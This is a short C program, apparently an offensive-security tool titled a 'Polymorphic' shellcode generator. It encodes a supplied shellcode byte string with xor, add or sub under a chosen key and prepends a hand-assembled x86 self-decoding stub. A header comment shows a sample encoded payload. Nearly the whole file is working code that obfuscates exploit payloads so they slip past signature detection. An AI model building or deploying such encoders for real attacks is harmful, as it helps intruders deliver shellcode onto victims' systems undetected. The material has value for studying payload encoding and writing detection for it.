/*
"Polymorphic" shellcode generator - m0nad

Usage example:
$ ./psg xor 22 $(cat shellcode)
shellcode xor 0x16 encoded:
"\xeb\x0d\x5e\x6a\x23\x5f\x83\x34\x3e\x16\x4f\x75\xf9\xeb\x05\xe8\xee\xff\xff\xff\x27\xd6\x27\xcd\x27\xdf\x8f\xa6\xb2\xdb\x96\x7c\x1d\x4e\x47\x7e\x39\x39\x65\x7e\x7e\x39\x74\x7f\x78\x9f\xf5\x47\x9f\xf4\x45\x9f\xf7\xdb\x96"
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int calc(int , int, int);
void usage();
int decode_op(int);

enum OP {
	SUB = 0x2c,
	ADD = 0x04,
	XOR = 0x34
};

int
main(int argc, char ** argv)
{
	char * operation = argv[1]; 
	unsigned int size;
	unsigned short i, byte, key, op;
	if (argc != 4)
		usage(), exit(1);
	if (!strcmp(operation, "add")) {
		op = ADD;
	} else if (!strcmp(operation, "sub")) {
		op = SUB;
	} else if (!strcmp(operation, "xor")) {
		op = XOR;
	} else
		usage(), exit(1);
	key = atoi(argv[2]);
	size = strlen(argv[3]);
	printf("shellcode %s 0x%.2x encoded:\n", argv[1], key);
	printf("\"");
	printf(
				//_start:
"\\xeb\\x0d"			//    jmp    encoded
				//decoder:
"\\x5e"				//    pop    %esi
"\\x6a\\x%.2x"			//    push   $size
"\\x5f"				//    pop    %edx
				//decoder_loop:
"\\x83\\x%.2x\\x3e\\x%.2x"	//    inst   $key,(%esi,%edx,1)
"\\x4f"				//    dec    %edx
"\\x75\\xf9"			//    jne    decoder_loop
"\\xeb\\x05"			//    jmp    shellcode
				//encoded:
"\\xe8\\xee\\xff\\xff\\xff",	//    call   decoder
				//shellcode:
size, decode_op(op), key);

	for(i = 0; i < size; i++) {
		byte = (argv[3][i] & 0xff);
		printf("\\x%.2x", calc(op, byte, key));
	}
	puts("\"");
	return 0;
}

void
usage()
{
	printf("Polymorphic shellcode generator - m0nad\n\n");
	printf("Usage:\n\t./psg <type> <key> <bytes>\n");
	printf("Types:\n\txor\n\tadd\n\tsub\n");
	printf("Ex:\n\t./psg xor 10 $(cat shellcode)\n");
	exit(1);
}

int
calc(int operation, int op1, int op2)
{
	switch (operation) {
		case ADD:
			return op1 + op2;
		case SUB:
			return op1 - op2;
		case XOR:
			return op1 ^ op2;
		default:
			return 0;
	}
}

int
decode_op(int op)
{
	switch (op) {
		case ADD:
			return SUB;
		case SUB:
			return ADD;
		case XOR:
			return XOR;
		default:
			return 0;
	}
}
